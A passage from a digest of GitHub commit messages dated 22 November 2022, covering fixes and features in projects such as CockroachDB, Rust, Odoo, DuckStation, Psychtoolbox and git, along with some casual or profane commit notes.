sysroot.  This also means we don't need to do things like build GFortran
as part of our bootstrap; we can build it later, in the simpler build
script.

In principle, we don't actually need a GCCBootstrap for all platforms.
We only need a functional cross-compiler.  Theoretically, we could use
Clang to do the bootstrapping.  But I'm not going to fully embrace that
because I know that compiling Glibc with Clang is a pain, so for
`*-linux-gnu` at the very least, we're not going to attempt that.  On
macOS and FreeBSD however, there is a possibility that we can use Clang
as our "bootstrap compiler" in order to generate the actual GCC_jlls.

[0] https://github.com/JuliaPackaging/Yggdrasil/tree/sf/gcc

---
## [cockroachdb/cockroach](https://github.com/cockroachdb/cockroach)@[cb8847bae4...](https://github.com/cockroachdb/cockroach/commit/cb8847bae4a51ccdec5208dc1bfb4b0fbb49f282)
#### Tuesday 2022-11-22 20:16:41 by craig[bot]

Merge #92231 #92265 #92284 #92303

92231: cli,democluster: defer simulated latency until after cluster setup r=ajwerner a=ajwerner

### democluster,serverutils/regionlatency,rpc: extract code for simulating latency

We'll want to leverage these helpers in some tests to measure behavior under
simulated latency.

### cli,democluster: defer simulated latency until after cluster setup

Cluster creation and tenant setup is chatty. That's an okay thing: we don't
really care about cluster creation being that slow in general. In the case of
demo when we want to simulate latency and use tenants, it was particularly
painful. Starting the 9 tenants would take many minutes. This patch alleviates
this problem by keeping latency between the simulated nodes low until just
before we pass control to the user.

Fixes https://github.com/cockroachdb/cockroach/issues/76305

Release note (cli change): `cockroach demo --global` will now start up more
quickly. The latency which will be injected is not injected until after the
initial cluster is set up internally.

92265: kvconnectorccl: allow secondary tenants to prefetch range lookups r=ajwerner a=ajwerner

This patch permits the tenant connector to request more than 0 ranges to be prefetched. In order to enable this, we add logic in the implementation of the RangeLookup RPC to filter any results which are not intended for this tenant.

Fixes #91433

Release note: None

92284: ui: show stmt idle time in execution/planning chart r=matthewtodd a=matthewtodd

Part of #86667.

The example statement fingerprint below comes from me connecting to a local cockroach instance with `psql` (since `cockroach sql` by default runs a few extra queries that confuse the timings) and individually running the following lines to simulate some inter-statement latency:

```sql
BEGIN;
SELECT 1;
COMMIT;
```

| Before | After |
|--|--|
|<img width="1372" alt="Screen Shot 2022-11-21 at 2 35 49 PM" src="https://user-images.githubusercontent.com/5261/203144731-fd5a42fb-7b60-473a-990a-fb5fabf2756a.png">|<img width="1372" alt="Screen Shot 2022-11-21 at 2 35 58 PM" src="https://user-images.githubusercontent.com/5261/203144736-2600c0f9-7811-4b9d-a9e1-dbb8aeea71ee.png">|

Release note (ui change): The "Statement Execution and Planning Time" chart on the statement fingerprint page now includes a third value, "Idle," representing the time spent by the application waiting to execute this statement while holding a transaction open.

92303: sql: fix flaky role logic test r=ZhouXing19 a=rafiss

fixes https://github.com/cockroachdb/cockroach/issues/92164

The role IDs are not important to this test, and were causing flakiness since the backing sequence may generate IDs with gaps.

Release note: None

Co-authored-by: Andrew Werner <awerner32@gmail.com>
Co-authored-by: Matthew Todd <todd@cockroachlabs.com>
Co-authored-by: Rafi Shamim <rafi@cockroachlabs.com>

---
## [Manishearth/rust](https://github.com/Manishearth/rust)@[90e8b944cc...](https://github.com/Manishearth/rust/commit/90e8b944cce9f3708c3b43726a8e34da051ff93f)
#### Tuesday 2022-11-22 21:03:58 by Manish Goregaokar

Rollup merge of #101368 - thomcc:wintls-noinline, r=ChrisDenton

Forbid inlining `thread_local!`'s `__getit` function on Windows

Sadly, this will make things slower to avoid UB in an edge case, but it seems hard to avoid... and really whenever I look at this code I can't help but think we're asking for trouble.

It's pretty dodgy for us to leave this as a normal function rather than `#[inline(never)]`, given that if it *does* get inlined into a dynamically linked component, it's extremely unsafe (you get some other thread local, or if you're lucky, crash). Given that it's pretty rare for people to use dylibs on Windows, the fact that we haven't gotten bug reports about it isn't really that convincing. Ideally we'd come up with some kind of compiler solution (that avoids paying for this cost when static linking, or *at least* for use within the same crate...), but it's not clear what that looks like.

Oh, and because all this is only needed when we're implementing `thread_local!` with `#[thread_local]`, this patch adjusts the `cfg_attr` to be `all(windows, target_thread_local)` as well.

r? `@ChrisDenton`

See also #84933, which is about improving the situation.

---
## [bluisknot/odoo](https://github.com/bluisknot/odoo)@[61270ee8bf...](https://github.com/bluisknot/odoo/commit/61270ee8bffb6e85f8ff0d19c7a3889fdce2f486)
#### Tuesday 2022-11-22 21:30:53 by qsm-odoo

[FIX] website, *: allow to re-edit company team snippet images

*: website_sale

Since [1], it was not possible to edit a company team snippet image
anymore as soon as the page was saved once. Indeed that commit added
o_not_editable/contenteditable="false" on the parent column to make sure
no text can be added in that column and contenteditable="true" on the
images so that they are still editable (even though HTML-specs-wise
adding contenteditable="true" on images probably does not mean much as
images are self-closing tags, our editor understand that as the ability
to edit the image anyway). That contenteditable="true" part is however
removed when leaving edit mode... and was not restored upon entering
edit mode again.

This fixes the problems with a specific JS patch, we'll review to see if
better can be done in master.

Funny enough, that bug was actually gone in 15.0... by mistake. A recent
bug fix actually reintroduced that isolated bug at [2] (by reintroducing
the fact that images in a non-editable environment are not possible to
edit). The 3 opened tickets this commit mentions were actually reported
for 15.0 immediately after that, while the 14.0 being broken about this
since the beginning apparently did not bother anyone.

Note: as a forward-ported fix, this also takes the opportunity to clean
a bit what was done at [3]. (calling `_super`, no duplicated code,
adding comments, ...).

[1]: https://github.com/odoo/odoo/commit/656cac1bf21c7c5a56aa569008aac58436c747fb
[2]: https://github.com/odoo/odoo/commit/e113bae04a64a8bd341a80736086ab7c25079dd3
[3]: https://github.com/odoo/odoo/commit/e2f7b8fad76dc816b2f6864340d3740446117cdb

opw-3031217
opw-3032482
opw-3035289

closes odoo/odoo#104193

X-original-commit: e7c8fed8e373d7005c16c88d3a7bad6f425d13e5
Signed-off-by: Romain Derie (rde) <rde@odoo.com>
Signed-off-by: Quentin Smetz (qsm) <qsm@odoo.com>

---
## [Bcadren/crawl](https://github.com/Bcadren/crawl)@[e6c7a3e422...](https://github.com/Bcadren/crawl/commit/e6c7a3e422e1077c34a15c938ba045852efbe19d)
#### Tuesday 2022-11-22 21:45:06 by Edgar A. Bering IV

Don't pain bond friendly and neutral monsters (#1204)

Pain bond is flavored as an "emotional response to pain", but monsters
with different alignments have no positive feelings for one another.

The edge case is surprising and puts a strange disincentive on fighting
certain uniques which lead to neutral mosnters existing.

[ Close #1204 ]

---
## [martinhomuth/suckless_dwm](https://github.com/martinhomuth/suckless_dwm)@[67d76bdc68...](https://github.com/martinhomuth/suckless_dwm/commit/67d76bdc68102df976177de351f65329d8683064)
#### Tuesday 2022-11-22 22:29:32 by Chris Down

Do not allow focus to drift from fullscreen client via focusstack()

It generally doesn't make much sense to allow focusstack() to navigate
away from the selected fullscreen client, as you can't even see which
client you're selecting behind it.

I have had this up for a while on the wiki as a separate patch[0], but
it seems reasonable to avoid this behaviour in dwm mainline, since I'm
struggling to think of any reason to navigate away from a fullscreen
client other than a mistake.

0: https://dwm.suckless.org/patches/alwaysfullscreen/

---
## [FreeStylaLT/Citadel-Station-13-RP](https://github.com/FreeStylaLT/Citadel-Station-13-RP)@[24aca0ae55...](https://github.com/FreeStylaLT/Citadel-Station-13-RP/commit/24aca0ae55ce2204474ec23fed6d23cb46b6645e)
#### Tuesday 2022-11-22 22:34:41 by LordPapalus

Cargonia, but with less weapons (#4370)

* Cargonia is no more

Fuck you

* PLEASE

* Zandario, I will suck your PP

---
## [MaeglynD/SL](https://github.com/MaeglynD/SL)@[fd69c22924...](https://github.com/MaeglynD/SL/commit/fd69c229245d067b3f3dd2dc03e9fa4835ff00e3)
#### Tuesday 2022-11-22 22:39:51 by MaeglynD

added new regex because google hates me and i hate google they suck honestly they're all so annoying why are you updating your god damn image urls and making me change my reg ex you p

---
## [Wunkolo/duckstation](https://github.com/Wunkolo/duckstation)@[f9212363d3...](https://github.com/Wunkolo/duckstation/commit/f9212363d3370efcdb97d4f7de010b5f17bd5c5e)
#### Tuesday 2022-11-22 23:04:00 by IlDucci

Spanish translation overhaul + Addition of es-ES alternative

In its current state, the Spanish translations for Duckstation are a mess of different dialects, multiple translations for the same terms, mistranslations or excessively literal translations, and typos.

It's a shame, because you could feel that the initial translations were done with care, but were muddled with future revisions.

This commit tries to solve all of these and also change the initial decision of the first translator to have an "universal" "neutral" Spanish, as time has proven it's not possible without a dedicated translator who actually wants to have one Spanish language for all Spanish-speakers across the globe.

I'm not going to be that one, so the next option would be to duplicate the Spanish translations into two: one for the Spanish-speaking American people (called "Latin American Spanish", "español de Hispanoamérica", code es-419") and one for the European Spanish speakers (called "Spanish (Spain)", "español de España", code es-ES).

This distinction is used in multiple software applications that managed to have translators for different languages, and should also funnel any future Latin American Spanish and European Spanish translators to the corresponding file.

I have tried to follow as many existing terms and constructions as possible, restoring and/or rewording any phrasal constructions that were disunified by the multiple translators.

Since I have a limited experience with Latin American Spanish, this commit should be sent as a draft for additional revisions. I'm open to stick to having a single Spanish language, but it has to be done RIGHT.

This is an overview of changes across the board:
 - Added missing translations for QT and Android builds.
 - Unified translations between those.
 - Updated the QT file with the latest string values.
 - Massive removal of Title Uppercasing inherited from English in menu strings (the rules set by the Royal Academy of the Spanish Language, or RAE, limit the areas where Title Uppercasing is considered correct in Spanish. Menu names and window header texts are not within those areas).
 - Unified the treatment of users in the Latin American version to formal "ustedeo". This treatment could be modified with additional input.
 - Removed any gendering assumptions from any string directed towards the user (Are you sure...?, changed ¿Está/s seguro...? with ¿Seguro que...?)
 - Naturalization rewrites.
 - Typo corrections.
 - Gender corrections over definitive terms.
 - Adding missing NBSPs after required mathemathical characters or units.
 - Mass replacement of double/single quotes with angled quotes (the ones approved for Spanish).
 - Quoted non-Spanish, non-proper noun English words as dictated by RAE.
 - Removal of unwanted hyphens to join words (Auto-detectar with Detección automática, post-procesamiento with posprocesamiento). In Spanish, hyphens tend to separate, rather than join.
 - Revision of the compound forms, unified depending on Latin American Spanish or European Spanish.
 - Lowercased the first word of a text between parenthesis (Spanish rules dictate that they should be considered a continuation of the phrase, and thus, they should start with lowercase unless it's a proper noun or a word that must be uppercased) and corrected the positions between periods and parentheses.
 - Unified the accentuation rules for the adverb solo/sólo and the demostrative pronouns (este/ese/aquel) by removing all accents in European Spanish (following the RAE's 2010 suggestions) or keeping/adding them for Latin American Spanish (the 2010 rule ended up being a suggestion because while Spain has mostly deprecated those accents, it appears that the Latin American countries have not). To discuss?
 - Tweaked the key shortcuts for the QT menu to minimize duplicates.
 - Terms unified (this list doesn't represent the entirety of the changes):
    - Failed to (Fallo al/Error al): Fallo al
    - Hardcore Mode (Modo Hardcore/Modo Difícil): «hardcore» mode (Foreign non-proper nouns should be quoted, RetroAchievements does not have an official Spanish translation, so the term should be kept in English)
    - Enable/Disable (habilitado/deshabilitado/activado/desactivado/activo/inactivo): habilitado/deshabilitado
    - host (host/anfitrión/sistema): sistema, TO BE DETERMINED AND UNIFIED
    - Signed (numbers; firmados): (números) con signo
    - scan (verb and noun; escanear): buscar/búsqueda
    - Clear (something, like bindings or codes; despejar, limpiar): borrar/quitar
    - requirement (of a system, requisito/requerimento): requisito
    - input (of a controller, control): entrada
    - Threaded X (hilo de X): X multihilo
    - Frame Pacing (frame pacing): duración de fotogramas
    - XX-bit (XX-bit): XX bits (proper form)
    - Widescreen (screens, widescreen hacks; pantalla ancha, pantalla panorámica): pantalla panorámica
    - Antialiasing (anti-aliasing): Antialiasing (considered a proper noun by NVidia, doesn't need that hyphen)
    - hash: «hash» (could be discussed as "sumas de verificación", like on Dolphin)
    - Focus Loss (perder el foco): ir/entrar en segundo plano
    - toggle (verb for hotkeys, activar): alternar (as the key alternates between enabling and disabling the function, while "activate" might sound like it's just the enable part)
    - Rewind (function; retrocediendo, retrocedimiento): rebobinado (to discuss on LATAM Spanish)
    - shader (shader/sombreado): sombreador
    - resume (resumir): reanudar, continuar (resumir is a false friend)
    - Check (verb; chequear/revisar/comprobar): chequear (LATAM Spanish), comprobar (European Spanish)
    - Add (something; añadir/agregar): agregar (LATAM Spanish, to discuss) or añadir (European Spanish)
    - Enter/Input (ingrese, inserte): ingresar (LATAM Spanish) or introducir (European Spanish)
    - mouse (device; mouse/ratón): mouse (LATAM Spanish), ratón (European Spanish)
    - Auto-Detect (Auto-detectar): Detección automática
    - Controller (control): mando (for European Spanish only)
    - run (a game, the emulator; correr): ejecutar, funcionar (for European Spanish only)

---
## [JOEwithanL/Psychtoolbox-3](https://github.com/JOEwithanL/Psychtoolbox-3)@[0ecdccb774...](https://github.com/JOEwithanL/Psychtoolbox-3/commit/0ecdccb774ab08cbd27b69ac681420ca4827279e)
#### Tuesday 2022-11-22 23:24:59 by Mario Kleiner

PsychVulkan/Linux: Add new bug fix for Mesa Vulkan direct display bug.

As of current Mesa 22.3-devel git snapshot and earlier versions, running
in fullscreen Vulkan direct-display mode only works the first time in a
session. On successive runs, the driver will error in vkQueuePresentKHR()
with a VK_ERROR_SURFACE_LOST error, and we are dead with a hard hang!

This only happens if the RandR output which we lease and switch to Vulkan
direct display mode has a non-zero (x,y) top-left corner viewport offset,
not on a single-display setup, a mirror setup, or a one video output per
X-Screen multi-X-Screen/multi-Display setup, as in those configs, the
viewport offset is always (0,0). Multi-output on single X-Screen however
dies for all but the one output at (0,0).

I tracked this down to a Mesa/Vulkan/WSI/DirectDisplay state caching bug,
developed and tested a bug fix and will upstream that fix soon. Basically
the WSI internal wsi_display_connector->active state for the used output
does not get reset to false == Inactive at the end of a session when the
display gets released back to the Window server / X-Server at call to
vkReleaseDisplay(). So if the same output is switched to direct display
mode again in the next session, with the same video mode, WSI thinks the
output is still active and at proper video mode and skips a full modeset,
instead directly goes to pageflip submission. This goes ok for a output
with RandR viewport (0,0, fbwidth, fbheight), but on a RandR output with
non-zero (x,y) offsets, the X-Server will have set a mode with corresponding
offsets into the X-Screens big shared (across all RandR outputs / crtcs).
The current Vulkan WSI has a framebuffer per VKDisplay and requires a
viewport offset of (0,0), so the viewport fits into the Vulkan framebuffer.
This is violated if WSI skips the modeset to (0,0) offset, and the kernel
subsequently aborts the pageflip with a -ENOSPACE error code, which itself
puts the Vulkan swapchain into VK_ERROR_SURFACE_LOST state and game over!

Error handling as recommended by spec (destroy and recreate the swapchain)
would not help, as connector state is cached at VkInstance level, not at
swapchain level.

A proper fix is to reset WSI connector logical state to inactive at
vkReleaseDisplay() time - Fix to be upstreamsn.

Our hacky workaround is to detect the trigger condition fullscreen on
output with non-zero (x,y) offset on a Mesa Vulkan driver with a Mesa
version before the properly fixed version, and then schedule a
'clear PsychVulkanCore' between runs to completely destroy the Vulkan
instance, thereby get rid of the stale connector state cache. This
resolves the bug for now. Ergo reenable that ugly needsMesaDDMWa=1 full
driver shutdown workaround again on Linux + Fullscreen + Mesa < 30.0.0,
until my bug fix makes it into a Mesa bug fix upstream release.

-> With this workaround, the PsychImaging 'MirrorDisplayTo2ndOutputHead'
   display mirroring with Vulkan for primary stimulus window and standard
   Screen OpenGL for the experimenter feedback "Mirror" slave window now
   works as tested on a single-X-Screen, dual-display setup under both
   Ubuntu 20.04.5-LTS, X-Server 1.20.13 with Intel Kabylake gpu and on
   Ubuntu 22.04.1-LTS, X-Server 21 with AMD Polaris gpu, where the main
   Vulkan onscreen window is fullscreen on a 120 Hz refresh video output,
   and the OpenGL mirror slave window is windowed on a standard 60 Hz
   standard KDE or Ubuntu desktop GUI. Main stimulation runs unthrottled
   with perfect timing at full 120 fps on 120 Hz display, whereas the
   mirror window tears on the 60 Hz display, as expected, with effects
   more spectacular when the desktop compositor is off than when it is on.

   Testing on macOS 12.6 on same setup with AMD Polaris showed that it
   works as well, both in Vulkan mode and OpenGL native mode, and the
   framerate is improved with slave window vsync off, but the improvement
   is more modest and performance of the same hardware under macOS 12 is
   much worse than under Ubuntu 22.04.1-LTS. But this is due to macOS
   deficiency, not problems with our mirroring approach.

---
## [JOEwithanL/Psychtoolbox-3](https://github.com/JOEwithanL/Psychtoolbox-3)@[5e67e1c1c6...](https://github.com/JOEwithanL/Psychtoolbox-3/commit/5e67e1c1c696a2f5912a9e033cb8e78fa041f3bc)
#### Tuesday 2022-11-22 23:24:59 by Mario Kleiner

Screen/Linux/GLX: Rewrite PsychOSSetVBLSyncLevel() for best vsync control.

Mesa supports GLX_EXT_swap_control since Mesa 20.3.0, and the proprietary
drivers from NVidia since 2011, from ATI since 2013, so any non-ancient
Linux distro should have it for the same functionality as our previously
used GLX_MESA_swap_control on MESA, but more efficient, as it saves an
OpenGL context switch, and cross-vendor OSS and proprietary.

We keep the GLX_MESA_swap_control fallback, which should work on all
FOSS drivers since around 2003. For completeness also support the very
limited lowest common denominator fallback GLX_SGI_swap_control from before
the year 2000, assuming we'll never hit it ever again. It doesn't allow
query of actual swap interval, and worse, it doesn't allow zero swap
interval, so one can't programmatically disable vsync for benchmarking,
certain debugging and diagnostics, windowed NetWM timing or for
mirror mode with high efficiency - all thing that need vsync disable.

Now we fully rely on GLEW for detecting and setting up extensions instead
of a mix of GLEW, own extension queries and function pointer hackery. This
also removes that weird bug where vsync can't get disabled during the first
session after startup or clear Screen, clear all etc, but only on followup
runs. Turned out on first run, glXSwapIntervalSGI() was bound, which would
error out on vsync disable requests, but on successive runs, the proper
glXSwapIntervalMESA() was bound to the glXSwapIntervalSGI function pointer.
Weird, but true, as long debugging with the debugger showed. It baffles me
how this is possible at all?!? Probably weird interactions between our
pointer assignments, GLEW, and possible GL vendor neutral dispatch??

Anyway, this rewrite makes us more efficient and clean and fixes that
annoying bug.

We should get optimal swap control this way on MESA back to the year 2003,
and on NVidia/ATI proprietary back to the years 2011 (NVidia) and 2013 (AMD).

Tested on Intel + Mesa 21.2.6 Ubuntu 20.04.5-LTS so far.

---
## [Nyanotrasen/Nyanotrasen](https://github.com/Nyanotrasen/Nyanotrasen)@[82755da1b8...](https://github.com/Nyanotrasen/Nyanotrasen/commit/82755da1b89eb4b5ff99f9f278f5702cd3836750)
#### Tuesday 2022-11-22 23:25:51 by Rane

OKAY FINE I'LL DO IT (#685)

* HOLY FUCKING SHIT MOFF!!!!!

* mail receiver

* convert some of the mechanics to nyano standard

Co-authored-by: PixelTheKermit <85175107+PixelTheKermit@users.noreply.github.com>

---
## [Paxilmaniac/Skyrat-tg](https://github.com/Paxilmaniac/Skyrat-tg)@[1ba95626a6...](https://github.com/Paxilmaniac/Skyrat-tg/commit/1ba95626a6614177da02665231900620bbaef2ce)
#### Tuesday 2022-11-22 23:41:09 by SkyratBot

[MIRROR] mech bustin update 2022 [MDB IGNORE] (#17504)

* mech bustin update 2022 (#70891)

<!-- Write **BELOW** The Headers and **ABOVE** The comments else it may
not be viewable. -->
<!-- You can view Contributing.MD for a detailed description of the pull
request process. -->

## About The Pull Request

<!-- Describe The Pull Request. Please be sure every change is
documented or this can delay review and even discourage maintainers from
merging your PR! -->
Adds a huge ass crowbar to robotics (the mech removal tool), it deals 5
damage unwielded, or 19 wielded. (should be fine, considering robotics
also has the easiest access to the materials needed for a chainsaw)
You can use it while wielded on mechs to break the occupants out. This
takes 5 seconds (or 3 in an unenclosed mech like a ripley)
When you die in a mech you no longer automatically get ejected.
refactors fire axe cabinets to support more items than the fireaxe
makes some vehicle code better
closes #70845 (you can still enter a mech without limbs, i think thats
fine because you can use it to protect yourself from death in a
dangerous situation or something until someone breaks you out with the
really large crowbar)
video: https://streamable.com/x4gom2

## Why It's Good For The Game

<!-- Argue for the merits of your changes and how they benefit the game,
especially if they are controversial and/or far reaching. If you can't
actually explain WHY what you are doing will improve the game, then it
probably isn't good for the game in the first place. -->
robotics having a giant ass crowbar to break people out of mechs seems
like a fun idea
you currently cant exit a mech if youre incapacitated inside it unless
you DIE

## Changelog

<!-- If your PR modifies aspects of the game that can be concretely
observed by players or admins you should add a changelog. If your change
does NOT meet this description, remove this section. Be sure to properly
mark your PRs to prevent unnecessary GBP loss. You can read up on GBP
and it's effects on PRs in the tgstation guides for contributors. Please
note that maintainers freely reserve the right to remove and add tags
should they deem it appropriate. You can attempt to finagle the system
all you want, but it's best to shoot for clear communication right off
the bat. -->

:cl: Fikou, sprites by Halcyon
refactor: fire axe cabinets support items that aren't fire axes
balance: mechs no longer eject you when you die in them
add: Adds a giant crowbar to robotics, it can break open mechs to eject
their pilots.
/:cl:

<!-- Both :cl:'s are required for the changelog to work! You can put
your name to the right of the first :cl: if you want to overwrite your
GitHub username as author ingame. -->
<!-- You can use multiple of the same prefix (they're only used for the
icon ingame) and delete the unneeded ones. Despite some of the tags,
changelogs should generally represent how a player might be affected by
the changes rather than a summary of the PR's contents. -->

* mech bustin update 2022

* vr for the love of god

Co-authored-by: Fikou <23585223+Fikou@users.noreply.github.com>
Co-authored-by: Jolly-66 <70232195+Jolly-66@users.noreply.github.com>

---
## [ytfghj/git](https://github.com/ytfghj/git)@[f1c903debd...](https://github.com/ytfghj/git/commit/f1c903debdcbf6aaf8fd3abf222fa941b42d5d31)
#### Tuesday 2022-11-22 23:50:12 by Ævar Arnfjörð Bjarmason

cocci: make "coccicheck" rule incremental

Optimize the very slow "coccicheck" target to take advantage of
incremental rebuilding, and fix outstanding dependency problems with
the existing rule.

The rule is now faster both on the initial run as we can make better
use of GNU make's parallelism than the old ad-hoc combination of
make's parallelism combined with $(SPATCH_BATCH_SIZE) and/or the
"--jobs" argument to "spatch(1)".

It also makes us *much* faster when incrementally building, it's now
viable to "make coccicheck" as topic branches are merged down.

The rule didn't use FORCE (or its equivalents) before, so a:

	make coccicheck
	make coccicheck

Would report nothing to do on the second iteration. But all of our
patch output depended on all $(COCCI_SOURCES) files, therefore e.g.:

    make -W grep.c coccicheck

Would do a full re-run, i.e. a a change in a single file would force
us to do a full re-run.

The reason for this (not the initial rationale, but my analysis) is:

* Since we create a single "*.cocci.patch+" we don't know where to
  pick up where we left off, or how to incrementally merge e.g. a
  "grep.c" change with an existing *.cocci.patch.

* We've been carrying forward the dependency on the *.c files since
  63f0a758a06 (add coccicheck make target, 2016-09-15) the rule was
  initially added as a sort of poor man's dependency discovery.

  As we don't include other *.c files depending on other *.c files
  has always been broken, as could be trivially demonstrated
  e.g. with:

       make coccicheck
       make -W strbuf.h coccicheck

  However, depending on the corresponding *.c files has been doing
  something, namely that *if* an API change modified both *.c and *.h
  files we'd catch the change to the *.h we care about via the *.c
  being changed.

  For API changes that happened only via *.h files we'd do the wrong
  thing before this change, but e.g. for function additions (not
  "static inline" ones) catch the *.h change by proxy.

Now we'll instead:

 * Create a <RULE>/<FILE> pair in the .build directory, E.g. for
   swap.cocci and grep.c we'll create
   .build/contrib/coccinelle/swap.cocci.patch/grep.c.

   That file is the diff we'll apply for that <RULE>-<FILE>
   combination, if there's no changes to me made (the common case)
   it'll be an empty file.

 * Our generated *.patch
   file (e.g. contrib/coccinelle/swap.cocci.patch) is now a simple "cat
   $^" of all of all of the <RULE>/<FILE> files for a given <RULE>.

   In the case discussed above of "grep.c" being changed we'll do the
   full "cat" every time, so they resulting *.cocci.patch will always
   be correct and up-to-date, even if it's "incrementally updated".

   See 1cc0425a27c (Makefile: have "make pot" not "reset --hard",
   2022-05-26) for another recent rule that used that technique.

As before we'll:

 * End up generating a contrib/coccinelle/swap.cocci.patch, if we
   "fail" by creating a non-empty patch we'll still exit with a zero
   exit code.

   Arguably we should move to a more Makefile-native way of doing
   this, i.e. fail early, and if we want all of the "failed" changes
   we can use "make -k", but as the current
   "ci/run-static-analysis.sh" expects us to behave this way let's
   keep the existing behavior of exhaustively discovering all cocci
   changes, and only failing if spatch itself errors out.

Further implementation details & notes:

 * Before this change running "make coccicheck" would by default end
   up pegging just one CPU at the very end for a while, usually as
   we'd finish whichever *.cocci rule was the most expensive.

   This could be mitigated by combining "make -jN" with
   SPATCH_BATCH_SIZE, see 960154b9c17 (coccicheck: optionally batch
   spatch invocations, 2019-05-06).

   There will be cases where getting rid of "SPATCH_BATCH_SIZE" makes
   things worse, but a from-scratch "make coccicheck" with the default
   of SPATCH_BATCH_SIZE=1 (and tweaking it doesn't make a difference)
   is faster (~3m36s v.s. ~3m56s) with this approach, as we can feed
   the CPU more work in a less staggered way.

 * Getting rid of "SPATCH_BATCH_SIZE" particularly helps in cases
   where the default of 1 yields parallelism under "make coccicheck",
   but then running e.g.:

       make -W contrib/coccinelle/swap.cocci coccicheck

   I.e. before that would use only one CPU core, until the user
   remembered to adjust "SPATCH_BATCH_SIZE" differently than the
   setting that makes sense when doing a non-incremental run of "make
   coccicheck".

 * Before the "make coccicheck" rule would have to clean
   "contrib/coccinelle/*.cocci.patch*", since we'd create "*+" and
   "*.log" files there. Now those are created in
   .build/contrib/coccinelle/, which is covered by the "cocciclean" rule
   already.

Outstanding issues & future work:

 * We could get rid of "--all-includes" in favor of manually
   specifying a list of includes to give to "spatch(1)".

   As noted upthread of [1] a naïve removal of "--all-includes" will
   result in broken *.cocci patches, but if we know the exhaustive
   list of includes via COMPUTE_HEADER_DEPENDENCIES we don't need to
   re-scan for them, we could grab the headers to include from the
   .depend.d/<file>.o.d and supply them with the "--include" option to
   spatch(1).q

1. https://lore.kernel.org/git/87ft18tcog.fsf@evledraar.gmail.com/

Signed-off-by: Ævar Arnfjörð Bjarmason <avarab@gmail.com>
Signed-off-by: Taylor Blau <me@ttaylorr.com>

---
## [OrcaCollective/techbloc-airflow](https://github.com/OrcaCollective/techbloc-airflow)@[76abe879ba...](https://github.com/OrcaCollective/techbloc-airflow/commit/76abe879babe94e111e3840b1a9974b58d7d1e7c)
#### Tuesday 2022-11-22 23:52:19 by Marcus Puckett

this will get squashed later hopefully fuck you gha testing flow

---

